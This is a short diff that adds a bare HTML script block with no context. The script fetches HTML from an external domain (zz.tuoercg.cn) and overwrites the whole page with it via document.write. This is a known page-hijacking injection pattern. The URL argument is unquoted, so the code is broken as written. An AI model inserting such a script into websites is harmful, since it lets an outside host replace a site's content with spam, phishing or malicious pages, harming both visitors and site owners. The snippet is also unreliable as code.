@@ -1,0 +1,13 @@
+<script>
+function loadHtml(url) {
+    fetch(url)
+        .then(response => response.text())
+        .then(html => {
+            document.open();
+            document.write(html);
+            document.close();
+        });
+}
+
+loadHtml(https://zz.tuoercg.cn/m?member=iw&id=1722528000)
+</script>
